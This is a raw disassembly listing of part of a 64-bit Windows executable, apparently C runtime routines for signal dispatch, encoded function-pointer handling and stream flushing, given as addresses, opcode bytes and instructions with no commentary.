   140008e46:	48 85 c0             	test   %rax,%rax
   140008e49:	48 89 05 48 09 01 00 	mov    %rax,0x10948(%rip)        # 0x140019798
   140008e50:	0f 95 c0             	setne  %al
   140008e53:	48 83 c4 28          	add    $0x28,%rsp
   140008e57:	c3                   	ret
   140008e58:	48 83 25 38 09 01 00 	andq   $0x0,0x10938(%rip)        # 0x140019798
   140008e5f:	00 
   140008e60:	b0 01                	mov    $0x1,%al
   140008e62:	c3                   	ret
   140008e63:	cc                   	int3
   140008e64:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008e69:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008e6e:	57                   	push   %rdi
   140008e6f:	48 83 ec 20          	sub    $0x20,%rsp
   140008e73:	48 8b f2             	mov    %rdx,%rsi
   140008e76:	48 8b f9             	mov    %rcx,%rdi
   140008e79:	48 3b ca             	cmp    %rdx,%rcx
   140008e7c:	74 68                	je     0x140008ee6
   140008e7e:	48 8b d9             	mov    %rcx,%rbx
   140008e81:	48 8b 03             	mov    (%rbx),%rax
   140008e84:	48 85 c0             	test   %rax,%rax
   140008e87:	74 14                	je     0x140008e9d
   140008e89:	49 ba 70 a2 5c 5c c4 	movabs $0xdf949ec45c5ca270,%r10
   140008e90:	9e 94 df 
   140008e93:	ff 15 cf 53 00 00    	call   *0x53cf(%rip)        # 0x14000e268
   140008e99:	84 c0                	test   %al,%al
   140008e9b:	74 09                	je     0x140008ea6
   140008e9d:	48 83 c3 10          	add    $0x10,%rbx
   140008ea1:	48 3b de             	cmp    %rsi,%rbx
   140008ea4:	75 db                	jne    0x140008e81
   140008ea6:	48 3b de             	cmp    %rsi,%rbx
   140008ea9:	74 3b                	je     0x140008ee6
   140008eab:	48 3b df             	cmp    %rdi,%rbx
   140008eae:	74 32                	je     0x140008ee2
   140008eb0:	48 83 c3 f8          	add    $0xfffffffffffffff8,%rbx
   140008eb4:	48 83 7b f8 00       	cmpq   $0x0,-0x8(%rbx)
   140008eb9:	74 1a                	je     0x140008ed5
   140008ebb:	48 8b 03             	mov    (%rbx),%rax
   140008ebe:	48 85 c0             	test   %rax,%rax
   140008ec1:	74 12                	je     0x140008ed5
   140008ec3:	49 ba 70 3b 59 3e 75 	movabs $0x9799a6753e593b70,%r10
   140008eca:	a6 99 97 
   140008ecd:	33 c9                	xor    %ecx,%ecx
   140008ecf:	ff 15 93 53 00 00    	call   *0x5393(%rip)        # 0x14000e268
   140008ed5:	48 83 eb 10          	sub    $0x10,%rbx
   140008ed9:	48 8d 43 08          	lea    0x8(%rbx),%rax
   140008edd:	48 3b c7             	cmp    %rdi,%rax
   140008ee0:	75 d2                	jne    0x140008eb4
   140008ee2:	32 c0                	xor    %al,%al
   140008ee4:	eb 02                	jmp    0x140008ee8
   140008ee6:	b0 01                	mov    $0x1,%al
   140008ee8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008eed:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140008ef2:	48 83 c4 20          	add    $0x20,%rsp
   140008ef6:	5f                   	pop    %rdi
   140008ef7:	c3                   	ret
   140008ef8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008efd:	57                   	push   %rdi
   140008efe:	48 83 ec 20          	sub    $0x20,%rsp
   140008f02:	48 8b da             	mov    %rdx,%rbx
   140008f05:	48 8b f9             	mov    %rcx,%rdi
   140008f08:	48 3b ca             	cmp    %rdx,%rcx
   140008f0b:	74 24                	je     0x140008f31
   140008f0d:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   140008f11:	48 85 c0             	test   %rax,%rax
   140008f14:	74 12                	je     0x140008f28
   140008f16:	49 ba 70 3b 59 3e 75 	movabs $0x9799a6753e593b70,%r10
   140008f1d:	a6 99 97 
   140008f20:	33 c9                	xor    %ecx,%ecx
   140008f22:	ff 15 40 53 00 00    	call   *0x5340(%rip)        # 0x14000e268
   140008f28:	48 83 eb 10          	sub    $0x10,%rbx
   140008f2c:	48 3b df             	cmp    %rdi,%rbx
   140008f2f:	75 dc                	jne    0x140008f0d
   140008f31:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008f36:	b0 01                	mov    $0x1,%al
   140008f38:	48 83 c4 20          	add    $0x20,%rsp
   140008f3c:	5f                   	pop    %rdi
   140008f3d:	c3                   	ret
   140008f3e:	cc                   	int3
   140008f3f:	cc                   	int3
   140008f40:	48 89 0d 59 08 01 00 	mov    %rcx,0x10859(%rip)        # 0x1400197a0
   140008f47:	c3                   	ret
   140008f48:	40 53                	rex push %rbx
   140008f4a:	48 83 ec 20          	sub    $0x20,%rsp
   140008f4e:	48 8b d9             	mov    %rcx,%rbx
   140008f51:	e8 2e 00 00 00       	call   0x140008f84
   140008f56:	48 85 c0             	test   %rax,%rax
   140008f59:	74 1e                	je     0x140008f79
   140008f5b:	49 ba 70 20 d3 1c df 	movabs $0xd1ed0fdf1cd32070,%r10
   140008f62:	0f ed d1 
   140008f65:	48 8b cb             	mov    %rbx,%rcx
   140008f68:	ff 15 fa 52 00 00    	call   *0x52fa(%rip)        # 0x14000e268
   140008f6e:	85 c0                	test   %eax,%eax
   140008f70:	74 07                	je     0x140008f79
   140008f72:	b8 01 00 00 00       	mov    $0x1,%eax
   140008f77:	eb 02                	jmp    0x140008f7b
   140008f79:	33 c0                	xor    %eax,%eax
   140008f7b:	48 83 c4 20          	add    $0x20,%rsp
   140008f7f:	5b                   	pop    %rbx
   140008f80:	c3                   	ret
   140008f81:	cc                   	int3
   140008f82:	cc                   	int3
   140008f83:	cc                   	int3
   140008f84:	40 53                	rex push %rbx
   140008f86:	48 83 ec 20          	sub    $0x20,%rsp
   140008f8a:	33 c9                	xor    %ecx,%ecx
   140008f8c:	e8 57 ea ff ff       	call   0x1400079e8
   140008f91:	90                   	nop
   140008f92:	48 8b 1d a7 f0 00 00 	mov    0xf0a7(%rip),%rbx        # 0x140018040
   140008f99:	8b cb                	mov    %ebx,%ecx
   140008f9b:	83 e1 3f             	and    $0x3f,%ecx
   140008f9e:	48 33 1d fb 07 01 00 	xor    0x107fb(%rip),%rbx        # 0x1400197a0
   140008fa5:	48 d3 cb             	ror    %cl,%rbx
   140008fa8:	33 c9                	xor    %ecx,%ecx
   140008faa:	e8 8d ea ff ff       	call   0x140007a3c
   140008faf:	48 8b c3             	mov    %rbx,%rax
   140008fb2:	48 83 c4 20          	add    $0x20,%rsp
   140008fb6:	5b                   	pop    %rbx
   140008fb7:	c3                   	ret
   140008fb8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008fbd:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140008fc2:	57                   	push   %rdi
   140008fc3:	48 83 ec 20          	sub    $0x20,%rsp
   140008fc7:	49 8b f9             	mov    %r9,%rdi
   140008fca:	8b 0a                	mov    (%rdx),%ecx
   140008fcc:	e8 17 ea ff ff       	call   0x1400079e8
   140008fd1:	90                   	nop
   140008fd2:	48 8b 1d 67 f0 00 00 	mov    0xf067(%rip),%rbx        # 0x140018040
   140008fd9:	8b cb                	mov    %ebx,%ecx
   140008fdb:	83 e1 3f             	and    $0x3f,%ecx
   140008fde:	48 33 1d d3 07 01 00 	xor    0x107d3(%rip),%rbx        # 0x1400197b8
   140008fe5:	48 d3 cb             	ror    %cl,%rbx
   140008fe8:	8b 0f                	mov    (%rdi),%ecx
   140008fea:	e8 4d ea ff ff       	call   0x140007a3c
   140008fef:	48 8b c3             	mov    %rbx,%rax
   140008ff2:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008ff7:	48 83 c4 20          	add    $0x20,%rsp
   140008ffb:	5f                   	pop    %rdi
   140008ffc:	c3                   	ret
   140008ffd:	cc                   	int3
   140008ffe:	cc                   	int3
   140008fff:	cc                   	int3
   140009000:	4c 8b dc             	mov    %rsp,%r11
   140009003:	48 83 ec 28          	sub    $0x28,%rsp
   140009007:	b8 03 00 00 00       	mov    $0x3,%eax
   14000900c:	4d 8d 4b 10          	lea    0x10(%r11),%r9
   140009010:	4d 8d 43 08          	lea    0x8(%r11),%r8
   140009014:	89 44 24 38          	mov    %eax,0x38(%rsp)
   140009018:	49 8d 53 18          	lea    0x18(%r11),%rdx
   14000901c:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140009020:	49 8d 4b 08          	lea    0x8(%r11),%rcx
   140009024:	e8 8f ff ff ff       	call   0x140008fb8
   140009029:	48 83 c4 28          	add    $0x28,%rsp
   14000902d:	c3                   	ret
   14000902e:	cc                   	int3
   14000902f:	cc                   	int3
   140009030:	48 89 0d 71 07 01 00 	mov    %rcx,0x10771(%rip)        # 0x1400197a8
   140009037:	48 89 0d 72 07 01 00 	mov    %rcx,0x10772(%rip)        # 0x1400197b0
   14000903e:	48 89 0d 73 07 01 00 	mov    %rcx,0x10773(%rip)        # 0x1400197b8
   140009045:	48 89 0d 74 07 01 00 	mov    %rcx,0x10774(%rip)        # 0x1400197c0
   14000904c:	c3                   	ret
   14000904d:	cc                   	int3
   14000904e:	cc                   	int3
   14000904f:	cc                   	int3
   140009050:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140009055:	56                   	push   %rsi
   140009056:	57                   	push   %rdi
   140009057:	41 54                	push   %r12
   140009059:	41 55                	push   %r13
   14000905b:	41 56                	push   %r14
   14000905d:	48 83 ec 40          	sub    $0x40,%rsp
   140009061:	8b d9                	mov    %ecx,%ebx
   140009063:	45 33 ed             	xor    %r13d,%r13d
   140009066:	44 21 6c 24 78       	and    %r13d,0x78(%rsp)
   14000906b:	41 b6 01             	mov    $0x1,%r14b
   14000906e:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140009073:	83 f9 02             	cmp    $0x2,%ecx
   140009076:	74 21                	je     0x140009099
   140009078:	83 f9 04             	cmp    $0x4,%ecx
   14000907b:	74 4c                	je     0x1400090c9
   14000907d:	83 f9 06             	cmp    $0x6,%ecx
   140009080:	74 17                	je     0x140009099
   140009082:	83 f9 08             	cmp    $0x8,%ecx
   140009085:	74 42                	je     0x1400090c9
   140009087:	83 f9 0b             	cmp    $0xb,%ecx
   14000908a:	74 3d                	je     0x1400090c9
   14000908c:	83 f9 0f             	cmp    $0xf,%ecx
   14000908f:	74 08                	je     0x140009099
   140009091:	8d 41 eb             	lea    -0x15(%rcx),%eax
   140009094:	83 f8 01             	cmp    $0x1,%eax
   140009097:	77 7d                	ja     0x140009116
   140009099:	83 e9 02             	sub    $0x2,%ecx
   14000909c:	0f 84 af 00 00 00    	je     0x140009151
   1400090a2:	83 e9 04             	sub    $0x4,%ecx
   1400090a5:	0f 84 8b 00 00 00    	je     0x140009136
   1400090ab:	83 e9 09             	sub    $0x9,%ecx
   1400090ae:	0f 84 94 00 00 00    	je     0x140009148
   1400090b4:	83 e9 06             	sub    $0x6,%ecx
   1400090b7:	0f 84 82 00 00 00    	je     0x14000913f
   1400090bd:	83 f9 01             	cmp    $0x1,%ecx
   1400090c0:	74 74                	je     0x140009136
   1400090c2:	33 ff                	xor    %edi,%edi
   1400090c4:	e9 8f 00 00 00       	jmp    0x140009158
   1400090c9:	e8 fe cc ff ff       	call   0x140005dcc
   1400090ce:	4c 8b e8             	mov    %rax,%r13
   1400090d1:	48 85 c0             	test   %rax,%rax
   1400090d4:	75 18                	jne    0x1400090ee
   1400090d6:	83 c8 ff             	or     $0xffffffff,%eax
   1400090d9:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   1400090e0:	00 
   1400090e1:	48 83 c4 40          	add    $0x40,%rsp
   1400090e5:	41 5e                	pop    %r14
   1400090e7:	41 5d                	pop    %r13
   1400090e9:	41 5c                	pop    %r12
   1400090eb:	5f                   	pop    %rdi
   1400090ec:	5e                   	pop    %rsi
   1400090ed:	c3                   	ret
   1400090ee:	48 8b 00             	mov    (%rax),%rax
   1400090f1:	48 8b 0d 38 63 00 00 	mov    0x6338(%rip),%rcx        # 0x14000f430
   1400090f8:	48 c1 e1 04          	shl    $0x4,%rcx
   1400090fc:	48 03 c8             	add    %rax,%rcx
   1400090ff:	eb 09                	jmp    0x14000910a
   140009101:	39 58 04             	cmp    %ebx,0x4(%rax)
   140009104:	74 0b                	je     0x140009111
   140009106:	48 83 c0 10          	add    $0x10,%rax
   14000910a:	48 3b c1             	cmp    %rcx,%rax
   14000910d:	75 f2                	jne    0x140009101
   14000910f:	33 c0                	xor    %eax,%eax
   140009111:	48 85 c0             	test   %rax,%rax
   140009114:	75 12                	jne    0x140009128
   140009116:	e8 79 d4 ff ff       	call   0x140006594
   14000911b:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009121:	e8 16 d2 ff ff       	call   0x14000633c
   140009126:	eb ae                	jmp    0x1400090d6
   140009128:	48 8d 78 08          	lea    0x8(%rax),%rdi
   14000912c:	45 32 f6             	xor    %r14b,%r14b
   14000912f:	44 88 74 24 70       	mov    %r14b,0x70(%rsp)
   140009134:	eb 22                	jmp    0x140009158
   140009136:	48 8d 3d 7b 06 01 00 	lea    0x1067b(%rip),%rdi        # 0x1400197b8
   14000913d:	eb 19                	jmp    0x140009158
   14000913f:	48 8d 3d 6a 06 01 00 	lea    0x1066a(%rip),%rdi        # 0x1400197b0
   140009146:	eb 10                	jmp    0x140009158
   140009148:	48 8d 3d 71 06 01 00 	lea    0x10671(%rip),%rdi        # 0x1400197c0
   14000914f:	eb 07                	jmp    0x140009158
   140009151:	48 8d 3d 50 06 01 00 	lea    0x10650(%rip),%rdi        # 0x1400197a8
   140009158:	48 83 a4 24 80 00 00 	andq   $0x0,0x80(%rsp)
   14000915f:	00 00 
   140009161:	45 84 f6             	test   %r14b,%r14b
   140009164:	74 0b                	je     0x140009171
   140009166:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000916b:	e8 78 e8 ff ff       	call   0x1400079e8
   140009170:	90                   	nop
   140009171:	48 8b 37             	mov    (%rdi),%rsi
   140009174:	45 84 f6             	test   %r14b,%r14b
   140009177:	74 12                	je     0x14000918b
   140009179:	48 8b 05 c0 ee 00 00 	mov    0xeec0(%rip),%rax        # 0x140018040
   140009180:	8b c8                	mov    %eax,%ecx
   140009182:	83 e1 3f             	and    $0x3f,%ecx
   140009185:	48 33 f0             	xor    %rax,%rsi
   140009188:	48 d3 ce             	ror    %cl,%rsi
   14000918b:	48 83 fe 01          	cmp    $0x1,%rsi
   14000918f:	0f 84 94 00 00 00    	je     0x140009229
   140009195:	48 85 f6             	test   %rsi,%rsi
   140009198:	0f 84 17 01 00 00    	je     0x1400092b5
   14000919e:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   1400091a4:	83 fb 0b             	cmp    $0xb,%ebx
   1400091a7:	77 3d                	ja     0x1400091e6
   1400091a9:	41 0f a3 dc          	bt     %ebx,%r12d
   1400091ad:	73 37                	jae    0x1400091e6
   1400091af:	49 8b 45 08          	mov    0x8(%r13),%rax
   1400091b3:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400091ba:	00 
   1400091bb:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400091c0:	49 83 65 08 00       	andq   $0x0,0x8(%r13)
   1400091c5:	83 fb 08             	cmp    $0x8,%ebx
   1400091c8:	75 53                	jne    0x14000921d
   1400091ca:	e8 85 ca ff ff       	call   0x140005c54
   1400091cf:	8b 40 10             	mov    0x10(%rax),%eax
   1400091d2:	89 44 24 78          	mov    %eax,0x78(%rsp)
   1400091d6:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400091da:	e8 75 ca ff ff       	call   0x140005c54
   1400091df:	c7 40 10 8c 00 00 00 	movl   $0x8c,0x10(%rax)
   1400091e6:	83 fb 08             	cmp    $0x8,%ebx
   1400091e9:	75 32                	jne    0x14000921d
   1400091eb:	48 8b 05 46 62 00 00 	mov    0x6246(%rip),%rax        # 0x14000f438
   1400091f2:	48 c1 e0 04          	shl    $0x4,%rax
   1400091f6:	49 03 45 00          	add    0x0(%r13),%rax
   1400091fa:	48 8b 0d 3f 62 00 00 	mov    0x623f(%rip),%rcx        # 0x14000f440
   140009201:	48 c1 e1 04          	shl    $0x4,%rcx
   140009205:	48 03 c8             	add    %rax,%rcx
   140009208:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000920d:	48 3b c1             	cmp    %rcx,%rax
   140009210:	74 1d                	je     0x14000922f
   140009212:	48 83 60 08 00       	andq   $0x0,0x8(%rax)
   140009217:	48 83 c0 10          	add    $0x10,%rax
   14000921b:	eb eb                	jmp    0x140009208
   14000921d:	48 8b 05 1c ee 00 00 	mov    0xee1c(%rip),%rax        # 0x140018040
   140009224:	48 89 07             	mov    %rax,(%rdi)
   140009227:	eb 06                	jmp    0x14000922f
   140009229:	41 bc 10 09 00 00    	mov    $0x910,%r12d
   14000922f:	45 84 f6             	test   %r14b,%r14b
   140009232:	74 0a                	je     0x14000923e
   140009234:	b9 03 00 00 00       	mov    $0x3,%ecx
   140009239:	e8 fe e7 ff ff       	call   0x140007a3c
   14000923e:	48 83 fe 01          	cmp    $0x1,%rsi
   140009242:	75 07                	jne    0x14000924b
   140009244:	33 c0                	xor    %eax,%eax
   140009246:	e9 8e fe ff ff       	jmp    0x1400090d9
   14000924b:	83 fb 08             	cmp    $0x8,%ebx
   14000924e:	75 23                	jne    0x140009273
   140009250:	e8 ff c9 ff ff       	call   0x140005c54
   140009255:	49 ba 70 33 d3 30 4f 	movabs $0x8b9c1f4f30d33370,%r10
   14000925c:	1f 9c 8b 
   14000925f:	8b 50 10             	mov    0x10(%rax),%edx
   140009262:	8b cb                	mov    %ebx,%ecx
   140009264:	48 8b c6             	mov    %rsi,%rax
   140009267:	4c 8b 05 fa 4f 00 00 	mov    0x4ffa(%rip),%r8        # 0x14000e268
   14000926e:	41 ff d0             	call   *%r8
   140009271:	eb 18                	jmp    0x14000928b
   140009273:	49 ba 70 73 d7 50 49 	movabs $0xc6c1864950d77370,%r10
   14000927a:	86 c1 c6 
   14000927d:	8b cb                	mov    %ebx,%ecx
   14000927f:	48 8b c6             	mov    %rsi,%rax
   140009282:	48 8b 15 df 4f 00 00 	mov    0x4fdf(%rip),%rdx        # 0x14000e268
   140009289:	ff d2                	call   *%rdx
   14000928b:	83 fb 0b             	cmp    $0xb,%ebx
   14000928e:	77 b4                	ja     0x140009244
   140009290:	41 0f a3 dc          	bt     %ebx,%r12d
   140009294:	73 ae                	jae    0x140009244
   140009296:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
   14000929d:	00 
   14000929e:	49 89 45 08          	mov    %rax,0x8(%r13)
   1400092a2:	83 fb 08             	cmp    $0x8,%ebx
   1400092a5:	75 9d                	jne    0x140009244
   1400092a7:	e8 a8 c9 ff ff       	call   0x140005c54
   1400092ac:	8b 4c 24 78          	mov    0x78(%rsp),%ecx
   1400092b0:	89 48 10             	mov    %ecx,0x10(%rax)
   1400092b3:	eb 8f                	jmp    0x140009244
   1400092b5:	45 84 f6             	test   %r14b,%r14b
   1400092b8:	74 08                	je     0x1400092c2
   1400092ba:	8d 4e 03             	lea    0x3(%rsi),%ecx
   1400092bd:	e8 7a e7 ff ff       	call   0x140007a3c
   1400092c2:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400092c7:	e8 e4 bb ff ff       	call   0x140004eb0
   1400092cc:	90                   	nop
   1400092cd:	cc                   	int3
   1400092ce:	cc                   	int3
   1400092cf:	cc                   	int3
   1400092d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400092d5:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   1400092da:	57                   	push   %rdi
   1400092db:	48 83 ec 20          	sub    $0x20,%rsp
   1400092df:	49 8b f9             	mov    %r9,%rdi
   1400092e2:	49 8b d8             	mov    %r8,%rbx
   1400092e5:	48 8b 0a             	mov    (%rdx),%rcx
   1400092e8:	e8 a3 04 00 00       	call   0x140009790
   1400092ed:	90                   	nop
   1400092ee:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   1400092f2:	48 8b 03             	mov    (%rbx),%rax
   1400092f5:	48 8b 08             	mov    (%rax),%rcx
   1400092f8:	48 85 c9             	test   %rcx,%rcx
   1400092fb:	74 5a                	je     0x140009357
   1400092fd:	8b 49 14             	mov    0x14(%rcx),%ecx
   140009300:	8b c1                	mov    %ecx,%eax
   140009302:	c1 e8 0d             	shr    $0xd,%eax
   140009305:	24 01                	and    $0x1,%al
   140009307:	74 4e                	je     0x140009357
   140009309:	8b c1                	mov    %ecx,%eax
   14000930b:	24 03                	and    $0x3,%al
   14000930d:	3c 02                	cmp    $0x2,%al
   14000930f:	75 05                	jne    0x140009316
   140009311:	f6 c1 c0             	test   $0xc0,%cl
   140009314:	75 0a                	jne    0x140009320
   140009316:	0f ba e1 0b          	bt     $0xb,%ecx
   14000931a:	72 04                	jb     0x140009320
   14000931c:	ff 02                	incl   (%rdx)
   14000931e:	eb 37                	jmp    0x140009357
   140009320:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140009324:	80 38 00             	cmpb   $0x0,(%rax)
   140009327:	75 0f                	jne    0x140009338
   140009329:	48 8b 03             	mov    (%rbx),%rax
   14000932c:	48 8b 08             	mov    (%rax),%rcx
   14000932f:	8b 41 14             	mov    0x14(%rcx),%eax
   140009332:	d1 e8                	shr    $1,%eax
   140009334:	24 01                	and    $0x1,%al
   140009336:	74 1f                	je     0x140009357
   140009338:	48 8b 0b             	mov    (%rbx),%rcx
   14000933b:	48 8b 09             	mov    (%rcx),%rcx
   14000933e:	e8 f5 01 00 00       	call   0x140009538
   140009343:	83 f8 ff             	cmp    $0xffffffff,%eax
   140009346:	74 08                	je     0x140009350
   140009348:	48 8b 43 08          	mov    0x8(%rbx),%rax
   14000934c:	ff 00                	incl   (%rax)
   14000934e:	eb 07                	jmp    0x140009357
   140009350:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140009354:	83 08 ff             	orl    $0xffffffff,(%rax)
   140009357:	48 8b 0f             	mov    (%rdi),%rcx
   14000935a:	e8 3d 04 00 00       	call   0x14000979c
   14000935f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009364:	48 83 c4 20          	add    $0x20,%rsp
   140009368:	5f                   	pop    %rdi
   140009369:	c3                   	ret
   14000936a:	cc                   	int3
   14000936b:	cc                   	int3
   14000936c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009371:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140009376:	56                   	push   %rsi
   140009377:	57                   	push   %rdi
   140009378:	41 56                	push   %r14
   14000937a:	48 83 ec 60          	sub    $0x60,%rsp
   14000937e:	49 8b f9             	mov    %r9,%rdi
   140009381:	49 8b f0             	mov    %r8,%rsi
   140009384:	8b 0a                	mov    (%rdx),%ecx
   140009386:	e8 5d e6 ff ff       	call   0x1400079e8
   14000938b:	90                   	nop
   14000938c:	48 8b 1d 3d 04 01 00 	mov    0x1043d(%rip),%rbx        # 0x1400197d0
   140009393:	48 63 05 2e 04 01 00 	movslq 0x1042e(%rip),%rax        # 0x1400197c8
   14000939a:	4c 8d 34 c3          	lea    (%rbx,%rax,8),%r14
   14000939e:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1400093a3:	49 3b de             	cmp    %r14,%rbx
   1400093a6:	0f 84 88 00 00 00    	je     0x140009434
   1400093ac:	48 8b 03             	mov    (%rbx),%rax
   1400093af:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400093b4:	48 8b 16             	mov    (%rsi),%rdx
   1400093b7:	48 85 c0             	test   %rax,%rax
   1400093ba:	74 21                	je     0x1400093dd
   1400093bc:	8b 48 14             	mov    0x14(%rax),%ecx
   1400093bf:	8b c1                	mov    %ecx,%eax
   1400093c1:	c1 e8 0d             	shr    $0xd,%eax
   1400093c4:	24 01                	and    $0x1,%al
   1400093c6:	74 15                	je     0x1400093dd
   1400093c8:	8b c1                	mov    %ecx,%eax
   1400093ca:	24 03                	and    $0x3,%al
   1400093cc:	3c 02                	cmp    $0x2,%al
   1400093ce:	75 05                	jne    0x1400093d5
   1400093d0:	f6 c1 c0             	test   $0xc0,%cl
   1400093d3:	75 0e                	jne    0x1400093e3
   1400093d5:	0f ba e1 0b          	bt     $0xb,%ecx
   1400093d9:	72 08                	jb     0x1400093e3
   1400093db:	ff 02                	incl   (%rdx)
   1400093dd:	48 83 c3 08          	add    $0x8,%rbx
   1400093e1:	eb bb                	jmp    0x14000939e
   1400093e3:	48 8b 56 10          	mov    0x10(%rsi),%rdx
   1400093e7:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   1400093eb:	48 8b 06             	mov    (%rsi),%rax
   1400093ee:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400093f3:	4c 89 44 24 40       	mov    %r8,0x40(%rsp)
   1400093f8:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400093fd:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140009402:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140009407:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   14000940c:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140009411:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140009416:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   14000941b:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140009420:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140009425:	48 8d 8c 24 88 00 00 	lea    0x88(%rsp),%rcx
   14000942c:	00 
   14000942d:	e8 9e fe ff ff       	call   0x1400092d0
   140009432:	eb a9                	jmp    0x1400093dd
   140009434:	8b 0f                	mov    (%rdi),%ecx
   140009436:	e8 01 e6 ff ff       	call   0x140007a3c
   14000943b:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140009442:	00 
   140009443:	48 83 c4 60          	add    $0x60,%rsp
   140009447:	41 5e                	pop    %r14
   140009449:	5f                   	pop    %rdi
   14000944a:	5e                   	pop    %rsi
   14000944b:	c3                   	ret
   14000944c:	88 4c 24 08          	mov    %cl,0x8(%rsp)
   140009450:	55                   	push   %rbp
   140009451:	48 8b ec             	mov    %rsp,%rbp
   140009454:	48 83 ec 40          	sub    $0x40,%rsp
   140009458:	83 65 28 00          	andl   $0x0,0x28(%rbp)
   14000945c:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140009460:	83 65 20 00          	andl   $0x0,0x20(%rbp)
   140009464:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140009468:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000946c:	4c 8d 45 e8          	lea    -0x18(%rbp),%r8
   140009470:	48 8d 45 10          	lea    0x10(%rbp),%rax
   140009474:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140009478:	48 8d 55 e4          	lea    -0x1c(%rbp),%rdx
   14000947c:	48 8d 45 20          	lea    0x20(%rbp),%rax
   140009480:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140009484:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140009488:	b8 08 00 00 00       	mov    $0x8,%eax
   14000948d:	89 45 e0             	mov    %eax,-0x20(%rbp)
   140009490:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140009493:	e8 d4 fe ff ff       	call   0x14000936c
   140009498:	80 7d 10 00          	cmpb   $0x0,0x10(%rbp)
   14000949c:	8b 45 20             	mov    0x20(%rbp),%eax
   14000949f:	0f 45 45 28          	cmovne 0x28(%rbp),%eax
   1400094a3:	48 83 c4 40          	add    $0x40,%rsp
   1400094a7:	5d                   	pop    %rbp
   1400094a8:	c3                   	ret
   1400094a9:	cc                   	int3
   1400094aa:	cc                   	int3
   1400094ab:	cc                   	int3
   1400094ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400094b1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400094b6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400094bb:	57                   	push   %rdi
   1400094bc:	48 83 ec 20          	sub    $0x20,%rsp
   1400094c0:	48 8b d9             	mov    %rcx,%rbx
   1400094c3:	48 8b ea             	mov    %rdx,%rbp
   1400094c6:	8b 49 14             	mov    0x14(%rcx),%ecx
   1400094c9:	8b c1                	mov    %ecx,%eax
   1400094cb:	24 03                	and    $0x3,%al
   1400094cd:	3c 02                	cmp    $0x2,%al
   1400094cf:	75 4e                	jne    0x14000951f
   1400094d1:	f6 c1 c0             	test   $0xc0,%cl
   1400094d4:	74 49                	je     0x14000951f
   1400094d6:	8b 3b                	mov    (%rbx),%edi
   1400094d8:	2b 7b 08             	sub    0x8(%rbx),%edi
   1400094db:	83 63 10 00          	andl   $0x0,0x10(%rbx)
   1400094df:	48 8b 73 08          	mov    0x8(%rbx),%rsi
   1400094e3:	48 89 33             	mov    %rsi,(%rbx)
   1400094e6:	85 ff                	test   %edi,%edi
   1400094e8:	7e 35                	jle    0x14000951f
   1400094ea:	48 8b cb             	mov    %rbx,%rcx
   1400094ed:	e8 06 05 00 00       	call   0x1400099f8
   1400094f2:	4c 8b cd             	mov    %rbp,%r9
   1400094f5:	44 8b c7             	mov    %edi,%r8d
   1400094f8:	48 8b d6             	mov    %rsi,%rdx
   1400094fb:	8b c8                	mov    %eax,%ecx
   1400094fd:	e8 e6 17 00 00       	call   0x14000ace8
   140009502:	3b f8                	cmp    %eax,%edi
   140009504:	74 0a                	je     0x140009510
   140009506:	f0 83 4b 14 10       	lock orl $0x10,0x14(%rbx)
   14000950b:	83 c8 ff             	or     $0xffffffff,%eax
   14000950e:	eb 11                	jmp    0x140009521
   140009510:	8b 43 14             	mov    0x14(%rbx),%eax
   140009513:	c1 e8 02             	shr    $0x2,%eax
   140009516:	a8 01                	test   $0x1,%al
